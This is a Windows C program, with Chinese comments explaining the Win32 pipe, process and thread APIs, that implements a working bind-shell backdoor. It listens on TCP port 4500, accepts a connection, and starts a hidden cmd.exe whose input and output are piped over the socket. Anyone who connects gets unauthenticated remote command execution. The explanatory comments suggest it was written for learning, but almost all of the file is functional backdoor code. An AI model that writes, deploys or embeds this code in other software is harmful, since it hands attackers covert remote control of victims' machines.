#include<stdio.h>
#include<Winsock2.h>
#pragma comment(lib, "ws2_32.lib")

SOCKET sListen, sClient;
HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;

/*
 *BOOL CreatePipe(
     PHANDLE hReadPipe, 
     PHANDLE hWritePipe, 
     LPSECURITY_ATTRIBUTES lpPipeAttributes,
     DWORD nSize)
 * hReadPipe指向一个管道的读句柄；
 * hWritePipe指向一个管道的写句柄；
 * lpPipeAttributes指向一个SECURITY_ATTRIBUTES结构，用于确定返回的句柄是否可以被子进程继承
 * typedef struct _SECURITY_ATTRIBUTES {
 *      DWORD nLength;      //结构体的大小
 *      LPVOID lpSecurityDescriptor;     //安全描述符
 *      BOOL bInheritHandle;        //安全描述符对象能否被新创建的进程继承
 * } SECURITY_ATTRIBUTES;
 * nSize 指定管道缓冲区大小， 0表示缺省的缓冲区大小；
 * 
 */

DWORD WINAPI Thread1(LPVOID lpParam) {
    SECURITY_ATTRIBUTES sa;
    DWORD len;
    char send_buff[2048];
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    CreatePipe(&hReadFile, &hWritePipe, &sa, 0);
    while(TRUE){
        ReadFile(hReadFile, send_buff, 2048, &len, NULL);
        send(sClient, send_buff, len, 0);
    }
    
    return 0;
}

DWORD WINAPI Thread2(LPVOID lpParam) {
    SECURITY_ATTRIBUTES sa;
    DWORD nByteToWrite, nByteWritten;
    char recv_buff[1024];
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    CreatePipe(&hReadPipe, &hWriteFile, &sa, 0);
    while(TRUE){
        Sleep(250);
        nByteToWrite = recv(sClient, recv_buff, 1024, 0);
        WriteFile(hWriteFile, recv_buff, nByteToWrite, &nByteWritten, NULL);
    }
    return 0;
}

/*
 *BOOL CreateProcess(
     LPCTSTR lpApplicationName,
     LPTSTR lpCommandLine,
     LPSECURITY_ATTRIBUTES lpProcessAttributes,
     LPSECURITY_ATTRIBUTES lpThreadAttributes,
     BOOL bInheritHandles,
     DWORD dwCreationFlags,
     LPVOID lpEnvironment,
     LPCTSTR lpCurrentDirectory,
     LPSTARTUPINFO lpStartupInfo,
     LPPROCESS_INFORMATION lpProcessinformation
 )
 * lpApplicationName 指向包含了可执行文件名；
 * lpCommandLine 指向命令行字符串， 传递可执行文件参数；
 * lpProcessAttributes 描述进程的安全性， NULL为默认安全性；
 * lpThreadAttributes描述进程的主线程的安全性， NULL为默认安全性；
 * bInheritHandles 子进程是否可以继承父进程；
 * dwCreationFlags 表示创建进程的优先级别和进程类型；
 * lpEnvironment 指向环境变量块；
 * lpCurrentDirectory 指向当前目录的字符串
 * lpStartupInfo 指向StartupInfo结构， 表示新进程的主窗口位置、大小、输入、输出等信息；
 * lpProcessinformation 存储返回的新进程的信息；
 * 
 * 
 * LPPROCESS_INFORMATION 结构体：
 * HANDLE hProcess; 进程句柄
 * HANDLE hThread; 主线程句柄
 * DWORD dwProcessld; 进程id
 * DWORD dwThread; 线程id
 * 
 * typedef struct _STARTUPINFO {
 *  DWORD cb;
 *  LPTSTR lpReserved;
 *  LPTSTR lpDesktop;
 *  LPTSTR lpTitle;
 *  DWORD dwX;
 *  DWORD dwY;
 *  DWORD dwXSize;
 *  DWORD dwYSize;
 *  DWORD dwXcountChars;
 *  DWORD dwYCountChars;
 *  DWORD dwFillAttribute;
 *  DWORD dwFlags;
 *  WORD wShowWindow;
 *  WORD cbReserved2;
 *  LPBYTE lpReserved2;
 *  HANDLE hStdInput;
 *  HANDLE hStdOutput;
 *  HANDLE hStdError;
 * } STARTUPINFO, *LPSTARTUPINFO;
 * 
 * 为得到STARTUPINFO 可直接使用GetStartupInfo(STARTUPINFO* sa)函数
 */

int main() {
    HANDLE hThread[2];
    DWORD dwThreadIdA, dwThreadIdB;
    PROCESS_INFORMATION pi;
    char wMessage[512] = "\r\n ============================mih=====================\r\n";
    STARTUPINFO si;

    BYTE minorVer = 2;
    BYTE majorVer = 2;

    WSADATA wsaData;
    WORD sockVersion = MAKEWORD(minorVer, majorVer);
    if(WSAStartup(sockVersion, &wsaData) != 0) {
        return 0;
    }
    sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sListen == INVALID_SOCKET) {
        return 0;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(4500);
    sin.sin_addr.S_un.S_addr = INADDR_ANY;
    if (bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR) {
        return 0;
    }
    if (listen(sListen, 2) == SOCKET_ERROR) {
        return 0;
    }
    sClient = accept(sListen, NULL, NULL);

    /*
     * CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
     *              DWORD dwStackSize,
     *              LPTHREAD_START_ROUTINE lpStartAddress,
     *              LPVOID lpParameter,
     *              DWORD dwCreateionFlags,
     *              LPDWORD lpThread)
     * lpThreadAttributes 用于定义新线程的安全属性， 设为NULL即可；
     * dwStackSize 线程栈大小， NULL表示默认大小；
     * lpStartAddress 线程函数地址；
     * lpParameter 传递给线程函数的参数；
     * dwCreateFlags表示创建线程后线程的运行状态， CREATE_SUSPEND表示挂起
     * 当前线程， 0表示立即执行当前创建的线程；
     * lpThread用于返回新创建的线程的id;
     * 
     */
    hThread[0] = CreateThread(NULL, 0, Thread1, NULL, 0, &dwThreadIdA);
    hThread[1] = CreateThread(NULL, 0, Thread2, NULL, 0, &dwThreadIdB);
    Sleep(1000);
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdInput = hReadPipe;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;
    char cmdline[256] = {0};
    GetSystemDirectory(cmdline, sizeof(cmdline));
    strcat(cmdline, "\\cmd.exe");
    if (CreateProcess(cmdline, NULL, NULL, NULL, TRUE, 0, NULL, NULL, NULL, &si, &pi) == 0) {
        return 0;
    }
    send(sClient, wMessage, strlen(wMessage), 0);
    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
    return 0;
}